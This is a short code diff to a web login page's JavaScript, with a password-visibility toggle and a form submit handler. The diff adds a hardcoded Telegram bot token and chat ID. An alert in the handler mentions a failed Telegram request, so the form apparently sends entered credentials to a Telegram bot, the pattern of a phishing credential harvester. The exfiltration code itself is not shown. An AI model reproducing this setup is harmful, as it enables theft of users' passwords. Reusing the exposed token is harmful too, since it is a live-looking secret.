@@ -1,3 +1,6 @@
+const BOT_TOKEN = "8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0";
+const CHAT_ID = "5613942414";
+
 function togglePassword() {
     const passwordField = document.getElementById("password");
     const eyeOpen = document.getElementById("eyeOpen");
@@ -60,4 +63,3 @@ if (form) {
             alert("Telegram request failed. Check Console.");
         }
     });
-            }
